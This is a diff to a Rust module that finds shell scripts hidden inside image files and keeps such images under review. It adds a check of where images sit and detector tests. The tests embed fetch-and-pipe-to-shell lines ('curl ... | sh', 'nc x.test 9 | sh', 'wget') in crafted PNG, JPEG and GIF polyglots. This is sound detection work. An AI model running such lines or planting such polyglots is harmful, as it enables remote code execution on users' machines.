@@ -7,13 +7,19 @@
 //! PNG does run it: it only looks for a NUL in the first line, and a PNG's
 //! first line has none. This says nothing about what the pixels are; a
 //! file that fails here is simply not passed over, and the source is then
-//! reviewed in full.
+//! reviewed in full. Nor does it rest on the bytes alone: an image is
+//! passed over only away from where files are run (see `Surroundings`),
+//! and a reviewed line that runs one is reported whatever the image holds
+//! (see `review::check_runs`).
 
+use std::collections::HashSet;
 use std::fs::File;
 use std::io::Read;
 use std::ops::Range;
 use std::path::Path;
 
+use crate::engine::plan::glob_matches;
+use crate::rules;
 use crate::sha256::{Digest, Sha256};
 
 /// The extensions of the formats checked here.
@@ -43,9 +49,18 @@ const SHORT_LINE: usize = 3;
 /// From this length a printable line is also tested for signs short
 /// enough to turn up in compressed data now and then.
 const SIGN_LINE: usize = 6;
+/// The same two lengths for a line that starts as text and goes on in
+/// other bytes. Megabytes of compressed pixels hold thousands of line
+/// breaks followed by a few printable bytes, so more of them must agree
+/// before the start of such a line counts.
+const PARTIAL_LINE: usize = 10;
+const PARTIAL_SIGN_LINE: usize = 16;
+/// From this length a run of printable bytes anywhere is searched for the
+/// words below.
+const WORD_RUN: usize = 8;
 
 /// How a line a shell would act on starts.
-const LINE_STARTS: &[&[u8]] = &[b"#!", b". ", b"./", b"~/", b"sh "];
+const LINE_STARTS: &[&[u8]] = &[b"#!", b". ", b"./", b"~/", b"sh ", b"source "];
 /// What such a line holds, wherever it is: the programs and paths a
 /// dropper uses.
 const WORDS: &[&[u8]] = &[
@@ -81,6 +96,113 @@ pub fn is_whole_file(path: &Path, expected: &Digest) -> bool {
         .is_ok_and(|read| read as u64 <= MAX_BYTES)
         && Sha256::digest(&bytes) == *expected
         && is_whole(&bytes)
+}
+
+/// The extensions of files a shell or an interpreter runs.
+const SCRIPT_EXTENSIONS: &[&str] = &["sh", "bash", "zsh", "fish", "py", "pl", "rb", "lua", "js"];
+
+/// The directory a path is in; empty at the top of the tree.
+fn directory(path: &str) -> &str {
+    path.rsplit_once('/').map_or("", |(directory, _)| directory)
+}
+
+/// What stands around the images of one tree, for deciding which of them
+/// may be passed over. A whole image is passed over because approved text
+/// does not run files it was not sent; that is known of a line that names
+/// the file it runs (see `review::check_runs`), and not of one that runs
+/// whatever is in a directory (`for h in hooks.d/*; do . "$h"; done`,
+/// `run-parts hooks.d`). So an image is left alone only away from where
+/// files are run: not in a directory that holds a script, and not in one
+/// that a reviewed line loops over, globs or hands to something that runs
+/// what it finds. A wallpaper among wallpapers stays what it was.
+#[derive(Default)]
+pub struct Surroundings {
+    /// Directories that hold a file a shell or an interpreter would run.
+    script_directories: HashSet<String>,
+    /// The directory and the name pattern of each place files are run
+    /// from; an empty directory is one that was not written out.
+    run_globs: Vec<(String, String)>,
+}
+
+impl Surroundings {
+    /// Notes the file at `path`: one marked to run, or named as a script,
+    /// makes its directory a place scripts are.
+    pub fn note_file(&mut self, path: &str, executable: bool) {
+        let name = path.rsplit('/').next().unwrap_or(path);
+        let script = name.rsplit_once('.').is_some_and(|(_, extension)| {
+            SCRIPT_EXTENSIONS.contains(&extension.to_ascii_lowercase().as_str())
+        });
+        if executable || script {
+            self.script_directories.insert(directory(path).to_string());
+        }
+    }
+
+    /// Notes the reviewed text of the file at `path`: a script by its
+    /// first line, and the directories and globs its lines run.
+    pub fn note_text(&mut self, path: &str, text: &str) {
+        if text.starts_with("#!") {
+            self.script_directories.insert(directory(path).to_string());
+        }
+        for line in text.lines() {
+            for word in rules::run_globs(line) {
+                let glob = run_glob(&word);
+                if self.run_globs.len() < MAX_RUN_GLOBS && !self.run_globs.contains(&glob) {
+                    self.run_globs.push(glob);
+                } else if self.run_globs.len() >= MAX_RUN_GLOBS {
+                    // Too many to keep apart: any directory may be one.
+                    self.run_globs = vec![(String::new(), "*".to_string())];
+                    return;
+                }
+            }
+        }
+    }
+
+    /// Whether an image at `path` is away from where files are run.
+    pub fn leaves_alone(&self, path: &str) -> bool {
+        let parent = directory(path);
+        let name = path.rsplit('/').next().unwrap_or(path);
+        let under = format!("/{parent}/");
+        !self.script_directories.contains(parent)
+            && !self.run_globs.iter().any(|(directory, pattern)| {
+                glob_matches(pattern, name)
+                    // Wherever the line was run from: `hooks.d/*` reaches
+                    // `x/hooks.d/` and, for a search, what is below it.
+                    && (directory.is_empty() || under.contains(&format!("/{directory}/")))
+            })
+    }
+}
+
+/// The most places kept; a tree with more is one where files run anywhere.
+const MAX_RUN_GLOBS: usize = 4096;
+
+/// A directory or glob as written, as the directory it names and the
+/// pattern a file name there must match. Parts that are not plain names (a
+/// variable, a glob, `..`) and what stands before them are dropped: where
+/// they lead is not known, so the rest matches wherever it is found.
+fn run_glob(word: &str) -> (String, String) {
+    let is_plain = |part: &str| !part.contains(['*', '?', '[', '{', '$', '~', '`']) && part != "..";
+    let mut parts: Vec<&str> = word
+        .split('/')
+        .filter(|part| !part.is_empty() && *part != ".")
+        .collect();
+    let pattern = match parts.last() {
+        Some(last) if !is_plain(last) && !word.ends_with('/') => {
+            let last = parts.pop().unwrap_or_default();
+            // Only `*` and `?` are matched here; any other pattern is
+            // taken to match every name.
+            if last.contains(['[', '{', '$', '~', '`']) || last == ".." {
+                "*"
+            } else {
+                last
+            }
+        }
+        _ => "*",
+    };
+    let from = parts
+        .iter()
+        .rposition(|part| !is_plain(part))
+        .map_or(0, |at| at + 1);
+    (parts[from..].join("/"), pattern.to_string())
 }
 
 /// What an image carries besides its pixels, added up while it is walked.
@@ -170,35 +292,130 @@ fn lines(data: &[u8]) -> impl Iterator<Item = &[u8]> {
         .map(|line| line.strip_suffix(b"\r").unwrap_or(line))
 }
 
-/// Whether a line after the first is one a shell would act on. Compressed
-/// pixels hold line breaks too, and now and then a few printable bytes
-/// between two of them, so a short line counts only when it starts like a
-/// command, and the shortest signs only in a line long enough to make a
-/// chance match rare. A wrong yes costs one full review; XMP packets
-/// (`xmp`) were checked on their own terms.
+/// A byte of a command as it is written: printable ASCII, or a tab.
+fn is_printable(byte: u8) -> bool {
+    matches!(byte, 0x20..=0x7e | b'\t')
+}
+
+/// Where a shell starts a comment in `text`: a `#` that begins a word,
+/// outside quotes.
+fn comment_start(text: &[u8]) -> Option<usize> {
+    let mut quote = None;
+    let mut escaped = false;
+    let mut begins_word = true;
+    for (at, byte) in text.iter().enumerate() {
+        if escaped {
+            escaped = false;
+            begins_word = false;
+            continue;
+        }
+        match (quote, *byte) {
+            (Some(open), byte) if byte == open => quote = None,
+            (None, b'\\') => escaped = true,
+            (None, b'\'' | b'"') => quote = Some(*byte),
+            (None, b'#') if begins_word => return Some(at),
+            (Some(_) | None, _) => {}
+        }
+        begins_word = quote.is_none() && matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|' | b'(');
+    }
+    None
+}
+
+/// Whether `text` holds `word` as a word of its own: not inside a longer
+/// one (`medieval`, `properly`), though a version may follow (`python3`).
+fn holds_word(text: &[u8], word: &[u8]) -> bool {
+    text.windows(word.len()).enumerate().any(|(at, window)| {
+        let before = at.checked_sub(1).and_then(|at| text.get(at));
+        let after = text.get(at + word.len());
+        window == word
+            && !(word.first().is_some_and(u8::is_ascii_alphanumeric)
+                && before.is_some_and(u8::is_ascii_alphanumeric))
+            && !(word.last().is_some_and(u8::is_ascii_alphanumeric)
+                && after.is_some_and(u8::is_ascii_alphabetic))
+    })
+}
+
+/// Whether `text`, the printable bytes a line starts with, is something a
+/// shell would act on. `closed` says the shell reads nothing else on the
+/// line; otherwise bytes that are not text follow, which a shell takes as
+/// one more word, or does not read at all after a `#`. Compressed pixels
+/// hold line breaks too, and now and then a few printable bytes after one,
+/// so the fewer bytes a sign has, the more of the line must be text for it
+/// to count. A wrong yes costs one full review.
+fn is_command_line(text: &[u8], closed: bool) -> bool {
+    // What follows a comment sign is not read: the command before it is as
+    // good as a whole line (`touch x; curl ... #` and then anything).
+    let code = comment_start(text).map_or(text, |at| &text[..at]);
+    let commented = code.len() < text.len() && !code.trim_ascii().is_empty();
+    let start_line = if closed || commented {
+        SHORT_LINE
+    } else {
+        PARTIAL_LINE
+    };
+    let sign_line = if closed { SIGN_LINE } else { PARTIAL_SIGN_LINE };
+    let command = text.trim_ascii_start();
+    // `$(x)` and `` `x` ``, whole: a substitution runs whatever its length.
+    let substitution = match command {
+        [b'$', b'(', rest @ ..] => rest.contains(&b')'),
+        [b'`', rest @ ..] => rest.contains(&b'`'),
+        _ => false,
+    };
+    // One backtick opens nothing a line can close; pixels hold it often.
+    let holds_sign = |sign: &[u8]| {
+        if sign == b"`" {
+            text.iter().filter(|byte| **byte == b'`').nth(1).is_some()
+        } else {
+            holds(text, sign)
+        }
+    };
+    text.len() >= LONG_LINE
+        || WORDS.iter().any(|sign| holds(text, sign))
+        || ((closed || commented) && substitution)
+        // Text, a comment sign, then bytes that are not text: no picture
+        // is made so, and a script hidden in one is.
+        || (commented && !closed && code.len() >= PARTIAL_LINE)
+        || (text.len() >= start_line && LINE_STARTS.iter().any(|start| command.starts_with(start)))
+        || (text.len() >= sign_line
+            && (matches!(command.first(), Some(b'/' | b'$'))
+                || SYNTAX.iter().any(|sign| holds_sign(sign))))
+}
+
+/// Whether the file holds a line a shell would act on. A shell runs a line
+/// up to its end whatever bytes are in it: what is not text is part of a
+/// word, a `#` hides the rest, and a `;` starts the next command. So each
+/// run of printable bytes is judged, not only lines printable throughout:
+/// the run a line starts with as a command line, and every run for the
+/// programs a dropper names, wherever on its line it is and on the first
+/// line too. A carriage return ends a line here as a line feed does; no
+/// shell reads it so, hence such a line is held to the longer lengths. XMP
+/// packets (`xmp`) were checked on their own terms.
 fn reads_as_script(bytes: &[u8], xmp: &[Range<usize>]) -> bool {
-    let mut start = 0;
-    for (number, line) in bytes.split(|byte| *byte == b'\n').enumerate() {
-        let range = start..start + line.len();
-        start = range.end + 1;
-        if number == 0
-            || xmp
-                .iter()
-                .any(|packet| packet.start <= range.start && range.end <= packet.end)
+    let is_break = |byte: Option<&u8>| matches!(byte, Some(b'\n' | b'\r'));
+    let mut at = 0;
+    while at < bytes.len() {
+        let start = at;
+        while bytes.get(at).copied().is_some_and(is_printable) {
+            at += 1;
+        }
+        if at == start {
+            at += 1;
+            continue;
+        }
+        if xmp
+            .iter()
+            .any(|packet| packet.start <= start && at <= packet.end)
         {
             continue;
         }
-        let line = line.strip_suffix(b"\r").unwrap_or(line);
-        if line.len() < SHORT_LINE || !line.iter().all(|byte| matches!(byte, 0x20..=0x7e | b'\t')) {
-            continue;
-        }
-        let command = line.trim_ascii_start();
-        if line.len() >= LONG_LINE
-            || LINE_STARTS.iter().any(|start| command.starts_with(start))
-            || WORDS.iter().any(|sign| holds(line, sign))
-            || (line.len() >= SIGN_LINE
-                && (matches!(command.first(), Some(b'/' | b'$'))
-                    || SYNTAX.iter().any(|sign| holds(line, sign))))
+        let text = &bytes[start..at];
+        let before = start.checked_sub(1).and_then(|before| bytes.get(before));
+        let after = bytes.get(at);
+        // A carriage return that is not half of a CR LF pair.
+        let lone_return =
+            before == Some(&b'\r') || (after == Some(&b'\r') && bytes.get(at + 1) != Some(&b'\n'));
+        let ends_line = after.is_none() || is_break(after);
+        if (is_break(before) && is_command_line(text, ends_line && !lone_return))
+            || (text.len() >= WORD_RUN && WORDS.iter().any(|word| holds_word(text, word)))
         {
             return true;
         }
@@ -447,7 +664,7 @@ fn webp(bytes: &[u8]) -> Option<Extras> {
 mod tests {
     use std::fs;
 
-    use super::{crc32, is_named, is_whole, is_whole_file};
+    use super::{Surroundings, crc32, is_named, is_whole, is_whole_file};
     use crate::sha256::Sha256;
     use crate::test_support::TempDir;
 
@@ -776,6 +993,166 @@ mod tests {
                 String::from_utf8_lossy(line)
             );
         }
+    }
+
+    /// A PNG whose pixel data is one stored (uncompressed) deflate block
+    /// holding `raw`: bytes an attacker chooses, in a file that is whole.
+    fn png_storing(raw: &[u8]) -> Vec<u8> {
+        let length = u16::try_from(raw.len()).unwrap();
+        let mut data = vec![0x78, 0x01, 0x01];
+        data.extend(length.to_le_bytes());
+        data.extend((!length).to_le_bytes());
+        data.extend(raw);
+        // Where the stream's checksum goes; nothing here reads it.
+        data.extend([0x80, 0x81, 0x82, 0x83]);
+        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
+        png.extend(chunk(*b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]));
+        png.extend(chunk(*b"IDAT", &data));
+        png.extend(chunk(*b"IEND", &[]));
+        png
+    }
+
+    /// A JPEG whose one scan holds `raw` as its compressed data.
+    fn jpeg_scanning(raw: &[u8]) -> Vec<u8> {
+        let mut jpeg = b"\xff\xd8\xff\xe0\x00\x04JF\xff\xdb\x00\x03\x00".to_vec();
+        jpeg.extend(b"\xff\xc0\x00\x03\x08\xff\xda\x00\x03\x01");
+        jpeg.extend(raw);
+        jpeg.extend(b"\xff\xd9");
+        jpeg
+    }
+
+    #[test]
+    fn a_line_a_shell_runs_counts_whatever_bytes_end_it() {
+        // A shell reads a line to its end: bytes that are not text after a
+        // `#` are a comment, and after a `;` a command that fails once the
+        // ones before it ran. Such a line is in pixel data here, where a
+        // decoder sees noise and `bash logo.png` sees a script.
+        for line in [
+            &b"touch /var/tmp/x; curl -s https://x.test/i | sh #\xff\x00"[..],
+            b"touch x; id >y #\xfe\x80",
+            b". ./logo.png #\x80",
+            b"sh ./a.gif;\x80\x81",
+            b"source ./a.gif #\x90",
+            b"nc x.test 9 | sh; \x80",
+            // After bytes that are a word to a shell, and then a `;`.
+            b"\x80\x81;curl -s https://x.test/i|sh;\x80",
+            b"\x90 wget x.test/i\x90",
+            // A substitution, and a command of one word.
+            b"$(id)",
+            b"`id`",
+            b"curl",
+        ] {
+            let mut raw = b"\x00\x12\n".to_vec();
+            raw.extend(line);
+            raw.extend(b"\n\x34");
+            for (name, image) in [("png", png_storing(&raw)), ("jpeg", jpeg_scanning(&raw))] {
+                assert!(super::png(&image).or_else(|| super::jpeg(&image)).is_some());
+                assert!(!is_whole(&image), "{name}: {}", line.escape_ascii());
+            }
+        }
+        // The same between carriage returns, and on a first line.
+        assert!(!is_whole(&png_storing(b"\x00\rcurl x.test/i|sh\r\x00")));
+        assert!(!is_whole(&jpeg_scanning(b"\x12;curl x.test/i|sh;#\x80")));
+        let mut first_line = b"GIF89a=1;c\xf6;;".to_vec();
+        first_line.extend(b";curl x.test/i|sh #".iter().chain(&[0x80; 365]));
+        first_line.extend(b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b");
+        assert!(super::gif(&first_line).is_some());
+        assert!(!is_whole(&first_line));
+
+        // The files these helpers make are whole images when the bytes in
+        // them are what pixels compress to: a few printable bytes after a
+        // line break and then others, a `#` among them, short runs.
+        for raw in [
+            &b"\x00\x12\nq9 #\x80\n\x34"[..],
+            b"\x00\x12\n. \x80\n./\x81\nsh \x82\n$(\x83\n`\x84\n",
+            b"\x00\x12\n. x1\x80\n$Ab3xQ9\x80\n",
+            b"\x00\r. x1\r$Ab3xQ9\r\x00",
+            b"\x00\x80curl x\x80;sh x\x80",
+            // Words that hold a program's name are not the program.
+            b"\x00a medieval town, curly hair, properly executed\x00",
+        ] {
+            assert!(is_whole(&png_storing(raw)), "{}", raw.escape_ascii());
+            assert!(is_whole(&jpeg_scanning(raw)), "{}", raw.escape_ascii());
+        }
+    }
+
+    #[test]
+    fn an_image_is_left_alone_only_away_from_where_files_run() {
+        let mut around = Surroundings::default();
+        for (path, executable) in [
+            ("preview.png", false),
+            ("colors.conf", false),
+            ("backgrounds/1.png", false),
+            ("backgrounds/2.jpg", false),
+            ("hooks/apply.lua", false),
+            ("bin/tool", true),
+            ("scripts/RUN.SH", false),
+        ] {
+            around.note_file(path, executable);
+        }
+        // A script by its first line only, and lines that run what is in
+        // a directory.
+        around.note_text("plugin/main", "#!/usr/bin/env python3\nprint(1)\n");
+        around.note_text(
+            "conf/setup.conf",
+            "for h in \"$HOME\"/hooks.d/*; do . \"$h\"; done\n\
+             run-parts --verbose ./parts\n\
+             find \"$dir/extra\" -type f -exec sh {} \\;\n\
+             source lib/*.inc\n\
+             cat ../snippets/*.gif | sh\n",
+        );
+        for path in [
+            "preview.png",
+            "backgrounds/3.png",
+            "backgrounds/dark/4.webp",
+            "conf/logo.png",
+            "lib/a.png",
+            "snippets/a.png",
+        ] {
+            assert!(around.leaves_alone(path), "{path}");
+        }
+        for path in [
+            // Beside a script: by its extension, its mode, its first line.
+            "hooks/a.png",
+            "bin/a.png",
+            "scripts/a.png",
+            "plugin/a.png",
+            // In a directory a line runs the files of, wherever it is.
+            "hooks.d/a.png",
+            "theme/hooks.d/a.png",
+            "parts/a.png",
+            "extra/deep/a.png",
+            "lib/a.inc",
+            "snippets/a.gif",
+        ] {
+            assert!(!around.leaves_alone(path), "{path}");
+        }
+
+        // A glob with no directory written out reaches any directory.
+        let mut anywhere = Surroundings::default();
+        anywhere.note_text("a.conf", "for f in \"$dir\"/*.png; do . \"$f\"; done\n");
+        assert!(!anywhere.leaves_alone("backgrounds/1.png"));
+        assert!(anywhere.leaves_alone("backgrounds/1.jpg"));
+        assert_eq!(
+            [
+                "hooks.d/*",
+                "./a/../b/",
+                "$x/c/[ab]*",
+                "*.sh",
+                "d",
+                "~/e/*/f/g?"
+            ]
+            .map(super::run_glob),
+            [
+                ("hooks.d", "*"),
+                ("b", "*"),
+                ("c", "*"),
+                ("", "*.sh"),
+                ("d", "*"),
+                ("f", "g?"),
+            ]
+            .map(|(directory, pattern)| (directory.to_string(), pattern.to_string()))
+        );
     }
 
     #[test]
